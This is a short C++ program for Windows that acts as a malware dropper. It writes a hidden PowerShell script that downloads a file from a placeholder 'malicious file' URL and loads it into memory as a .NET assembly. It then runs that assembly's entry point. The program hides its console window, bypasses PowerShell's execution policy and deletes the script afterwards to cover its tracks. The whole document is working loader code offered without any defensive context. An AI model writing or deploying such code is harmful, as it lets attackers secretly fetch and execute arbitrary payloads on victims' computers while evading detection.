#include <iostream> 
#include <fstream> 
#define _WIN32_WINNT 0x0500 
#include<windows.h> 

using namespace std; 

int main() 
{ 
ofstream file; 
file.open("test.ps1"); 

SetFileAttributes("test.ps1", FILE_ATTRIBUTE_HIDDEN); 
string newArg = "-auto"; 
string powershell; 

powershell = "$bytes = (Invoke-WebRequest \"THE DOWNLOAD URL 
OF THE MALICIOUS FILE\").Content;"; 

powershell += "$string = 
[System.Convert]::ToBase64String($bytes);"; 
powershell += "$bytes = 

[System.Convert]::FromBase64String($string);"; // 'Argument' not a 
typo 

powershell += "$assembly = 
[System.Reflection.Assembly]::Load($bytes);"; 

powershell += "$entryPointMethod = $assembly.GetTypes().Where({ 
$_.Name -eq 'Program' }, 'First').GetMethod('Main', 
[Reflection.BindingFlags] 'Static, Public, NonPublic');"; 
powershell += "$entryPointMethod.Invoke($null, (, [string[]] ('foo', 
'bar')));"; 

file << powershell << endl; 
file.close(); 
ShowWindow(GetConsoleWindow(), SW_HIDE); 

system("powershell -ExecutionPolicy Bypass -F test.ps1"); 
remove("test.ps1"); 
}